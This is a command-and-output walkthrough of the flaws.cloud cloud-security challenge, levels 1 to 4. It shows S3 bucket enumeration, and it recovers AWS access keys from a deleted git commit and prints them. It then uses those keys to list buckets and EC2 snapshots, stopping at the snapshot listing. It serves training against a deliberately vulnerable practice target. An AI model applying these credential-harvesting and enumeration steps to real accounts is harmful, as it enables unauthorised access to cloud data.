# Walkthrough flaws.cloud 

## Level 1

### **HTTP reconnaissance**
```
root@kali:~ # curl -sv flaws.cloud -o /dev/null 
*   Trying 52.218.233.66:80...
* TCP_NODELAY set
* Connected to flaws.cloud (52.218.233.66) port 80 (#0)
> GET / HTTP/1.1
> Host: flaws.cloud
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< x-amz-id-2: kvAeee5cldjcR72WQh5OCvsvbSEZGJVp2EZOcu64tXDuOHeYio/RjLGJIHGFQ0SupjCY21Si1cU=
< x-amz-request-id: D623B287C0DE67C4
< Date: Sun, 27 Sep 2020 07:02:25 GMT
< Last-Modified: Fri, 22 May 2020 18:16:45 GMT
< ETag: "f01189cce6aed3d3e7f839da3af7000e"
< Content-Type: text/html
< Content-Length: 3162
< Server: AmazonS3
< 
{ [1593 bytes data]
* Connection #0 to host flaws.cloud left intact
```
This is sufficient evidence that this a static website hosted on AWS S3 (https://docs.aws.amazon.com/AmazonS3/latest/dev/WebsiteEndpoints.html). Another quick test would be
```
root@kali:~ # curl -v 52.218.233.66 -H "Host: 52.218.233.66"
*   Trying 52.218.233.66:80...
* TCP_NODELAY set
* Connected to 52.218.233.66 (52.218.233.66) port 80 (#0)
> GET / HTTP/1.1
> Host: 52.218.233.66
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< x-amz-error-code: WebsiteRedirect
< x-amz-error-message: Request does not contain a bucket name.
< x-amz-request-id: 93A1C57B295047D7
< x-amz-id-2: n8pAd75u2fmtAt154fHQQbm6yjCkj3sFlHk+kKdZcRiFzUF2GVAjuya8xjhrzvU+gz7RayA4mZo=
< Location: https://aws.amazon.com/s3/
< Content-Type: text/html; charset=utf-8
< Content-Length: 348
< Date: Sun, 27 Sep 2020 07:09:41 GMT
< Server: AmazonS3
< 
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<h1>301 Moved Permanently</h1>
<ul>
<li>Code: WebsiteRedirect</li>
<li>Message: Request does not contain a bucket name.</li>
<li>RequestId: 93A1C57B295047D7</li>
<li>HostId: n8pAd75u2fmtAt154fHQQbm6yjCkj3sFlHk+kKdZcRiFzUF2GVAjuya8xjhrzvU+gz7RayA4mZo=</li>
</ul>
<hr/>
</body>
</html>
* Connection #0 to host 52.218.233.66 left intact
```
S3 buckets can be directly accessed (https://docs.aws.amazon.com/AmazonS3/latest/dev/UsingBucket.html) via HTTP(S). URL pattern is `http://<bucketname>.s3.amazonaws.com`. Due to misconfiguration, visiting this bucket gives us a directory structure:
```
root@kali:~ # curl -s flaws.cloud.s3.amazonaws.com | xmllint --format -
<?xml version="1.0" encoding="UTF-8"?>        
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
  <Name>flaws.cloud</Name>
  <Prefix/>
  <Marker/>          
  <MaxKeys>1000</MaxKeys>
  <IsTruncated>false</IsTruncated>
  <Contents> 
    <Key>hint1.html</Key>
    <LastModified>2017-03-14T03:00:38.000Z</LastModified>
    <ETag>"f32e6fbab70a118cf4e2dc03fd71c59d"</ETag>
    <Size>2575</Size>
    <StorageClass>STANDARD</StorageClass>
  </Contents>
  <Contents>
    <Key>hint2.html</Key>
    <LastModified>2017-03-03T04:05:17.000Z</LastModified>
    <ETag>"565f14ec1dce259789eb919ead471ab9"</ETag>
    <Size>1707</Size>
    <StorageClass>STANDARD</StorageClass>
  </Contents>
  <Contents>
    <Key>hint3.html</Key>
    <LastModified>2017-03-03T04:05:11.000Z</LastModified>
    <ETag>"ffe5dc34663f83aedaffa512bec04989"</ETag>
    <Size>1101</Size>
    <StorageClass>STANDARD</StorageClass>
  </Contents>
  <Contents>
    <Key>index.html</Key>
    <LastModified>2020-05-22T18:16:45.000Z</LastModified>
...
```
Browsing to the secret-*.html file shows us
```
root@kali:~ # curl -s flaws.cloud.s3.amazonaws.com/secret-dd02c7c.html
...
Level 2 is at <a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</a>
```

## Level 2

### **HTTP reconnaissance**
Similar to Level 1, we see that the Level 2 URL is hosted on S3 as well:
```
root@kali:~/.aws # curl -sv level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud -o /dev/null 
*   Trying 52.218.209.123:80...
* TCP_NODELAY set
* Connected to level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud (52.218.209.123) port 80 (#0)
> GET / HTTP/1.1
> Host: level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< x-amz-id-2: 7zUWuEqanaASAeDYywL1H4U2i7gdWc+90D4Oqapn274gp/A0W8FR8+62Of3E5mN8h1yAiwVIVoI=
< x-amz-request-id: 3BDEB47794AEF18B
< Date: Fri, 02 Oct 2020 04:03:07 GMT
< Last-Modified: Mon, 27 Feb 2017 02:02:14 GMT
< ETag: "bbc2900889794698e208a26ce3087b6f"
< Content-Type: text/html
< Content-Length: 2786
< Server: AmazonS3
< 
{ [625 bytes data]
* Connection #0 to host level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud left intact
```
But visiting the bucket URL does not reveal more content here; there seems to be more permission restriction:
```
root@kali:~/.aws # curl -s level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud.s3.amazonaws.com  | xmllint --format -
<?xml version="1.0" encoding="UTF-8"?>
<Error>
  <Code>AccessDenied</Code>
  <Message>Access Denied</Message>
  <RequestId>BBF3C478612F6696</RequestId>
  <HostId>2H8IuSG/C4dYwsyA/pKzX74SRiKfBl7gB9HH7/xwQy62uibBUrDCeKLWVerv/i6tqpQY7cjoRFE=</HostId>
</Error>
```
### **AWS CLI access**
There are a number of ways one can access any AWS resource. If the resource is (mistakenly or not) configured to allow public internet access, such as that in Level 1, then the access is via for example HTTP(S). Within AWS, there is also console access and programmatic access. A user can only access S3 buckets belonging to their own account with console access. But programmatic access can be less restrictive and to resources in a different account. To test the Level 2 bucket with programmatic access using awscli, first configure any user on your AWS console, and save the access key id and secret access key to ~/.aws/credentials
```
[default]
aws_access_key_id=AKIAIOSFODNN7EXAMPLE
aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```
These keys do have to be valid ones generated for the user from your account.

Now trying to access the Level 2 bucket (without explicit usage of `--profile` the awscli uses the default profile in the credentials file)
```
root@kali:~ # aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 18:02:15      80751 everyone.png
2017-03-02 19:47:17       1433 hint1.html
2017-02-26 18:04:39       1035 hint2.html
2017-02-26 18:02:14       2786 index.html
2017-02-26 18:02:14         26 robots.txt
2017-02-26 18:02:15       1051 secret-e4443fc.html
root@kali:~ # curl -s level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html
...
Level 3 is at <a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud">http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</a>
```

## Level 3

### HTTP reconnaissance
Try accessing the bucket via HTTP directly
```
root@kali:~ # curl -s level3-9afd3927f195e10225021a578e6f78df.flaws.cloud.s3.amazonaws.com | xmllint --format - | grep '<Key>'
    <Key>.git/COMMIT_EDITMSG</Key>
    <Key>.git/HEAD</Key>
    <Key>.git/config</Key>
    <Key>.git/description</Key>
    <Key>.git/hooks/applypatch-msg.sample</Key>
    <Key>.git/hooks/commit-msg.sample</Key>
    <Key>.git/hooks/post-update.sample</Key>
    <Key>.git/hooks/pre-applypatch.sample</Key>
    <Key>.git/hooks/pre-commit.sample</Key>
    <Key>.git/hooks/pre-rebase.sample</Key>
    <Key>.git/hooks/prepare-commit-msg.sample</Key>
    <Key>.git/hooks/update.sample</Key>
    <Key>.git/index</Key>
    <Key>.git/info/exclude</Key>
    <Key>.git/logs/HEAD</Key>
    <Key>.git/logs/refs/heads/master</Key>
    <Key>.git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25</Key>
    <Key>.git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df</Key>
    <Key>.git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c</Key>
    <Key>.git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b</Key>
    <Key>.git/objects/76/e4934c9de40e36f09b4e5538236551529f723c</Key>
    <Key>.git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c</Key>
    <Key>.git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526</Key>
    <Key>.git/objects/c2/aab7e03933a858d1765090928dca4013fe2526</Key>
    <Key>.git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2</Key>
    <Key>.git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2</Key>
    <Key>.git/objects/f2/a144957997f15729d4491f251c3615d508b16a</Key>
    <Key>.git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61</Key>
    <Key>.git/refs/heads/master</Key>
    <Key>authenticated_users.png</Key>
    <Key>hint1.html</Key>
    <Key>hint2.html</Key>
    <Key>hint3.html</Key>
    <Key>hint4.html</Key>
    <Key>index.html</Key>
    <Key>robots.txt</Key>
```
and looks like there is a git repository there. Pulling the entire bucket down:
```
root@kali:~ # mkdir flaws.cloud.level3.temp
root@kali:~ # cd flaws.cloud.level3.temp
root@kali:~/flaws.cloud.level3.temp # aws s3 sync --quiet s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud .
root@kali:~/flaws.cloud.level3.temp # git log
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
root@kali:~/flaws.cloud.level3.temp # git show b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

diff --git a/access_keys.txt b/access_keys.txt
deleted file mode 100644
index e3ae6dd..0000000
--- a/access_keys.txt
+++ /dev/null
@@ -1,2 +0,0 @@
-access_key AKIAJ366LIPB4IJKT7SA
-secret_access_key OdNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83Jys
```
which seems to be a typical example where developer committed test credentials to the git repo and "removed" it later in a new commit. Adding the acces key id and secret access key to a new profile in the credentials file:
```
[git]
aws_access_key_id=AKIAJ366LIPB4IJKT7SA
aws_secret_access_key=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
```
and now we can list all the buckets allowed access to the user with the credential:
```
root@kali:~/temp # aws --profile git s3api list-buckets
{
    "Buckets": [
        {
            "Name": "2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud",
            "CreationDate": "2017-02-12T21:31:07.000Z"
        },
        {
            "Name": "config-bucket-975426262029",
            "CreationDate": "2017-05-29T16:34:53.000Z"
        },
        {
            "Name": "flaws-logs",
            "CreationDate": "2017-02-12T20:03:24.000Z"
        },
        {
            "Name": "flaws.cloud",
            "CreationDate": "2017-02-05T03:40:07.000Z"
        },
        {
            "Name": "level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud",
            "CreationDate": "2017-02-24T01:54:13.000Z"
        },
        {
            "Name": "level3-9afd3927f195e10225021a578e6f78df.flaws.cloud",
            "CreationDate": "2017-02-26T18:15:44.000Z"
        },
        {
            "Name": "level4-1156739cfb264ced6de514971a4bef68.flaws.cloud",
            "CreationDate": "2017-02-26T18:16:06.000Z"
        },
        {
            "Name": "level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud",
            "CreationDate": "2017-02-26T19:44:51.000Z"
        },
        {
            "Name": "level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud",
            "CreationDate": "2017-02-26T19:47:58.000Z"
        },
        {
            "Name": "theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud",
            "CreationDate": "2017-02-26T20:06:32.000Z"
        }
    ],
    "Owner": {
        "DisplayName": "0xdabbad00",
        "ID": "d70419f1cb589d826b5c2b8492082d193bca52b1e6a81082c36c993f367a5d73"
    }
}
```

## Level 4

Visiting the Level 4 URL above gives us more information about this level. An EC2 instance is hosting a web server at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. And it seems that this level is about EC2 snapshots.

### **EC2 snapshots**
What can we do with snapshots?
```
root@kali:~ # aws --profile git ec2 help | grep snapshot
       o copy-snapshot
       o create-snapshot
       o create-snapshots
       o delete-snapshot
       o describe-fast-snapshot-restores
       o describe-import-snapshot-tasks
       o describe-snapshot-attribute
       o describe-snapshots
       o disable-fast-snapshot-restores
       o enable-fast-snapshot-restores
       o import-snapshot
       o modify-snapshot-attribute
       o reset-snapshot-attribute
```
Most of them require specifying a region. The region of the Level 4 EC2 instance URL can be found via
```
root@kali:~ # host 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud is an alias for ec2-35-165-182-7.us-west-2.compute.amazonaws.com.
ec2-35-165-182-7.us-west-2.compute.amazonaws.com has address 35.165.182.7
```
More details of the `describe-snapshots` subcommand can be found at
```
aws ec2 describe-snapshots help
```
To scope the snapshots to the leaked user credential, we use 
```
root@kali:~ # aws --profile git ec2 describe-snapshots --region us-west-2 --owner-ids self
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12.000Z",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ]
        }
    ]
}
```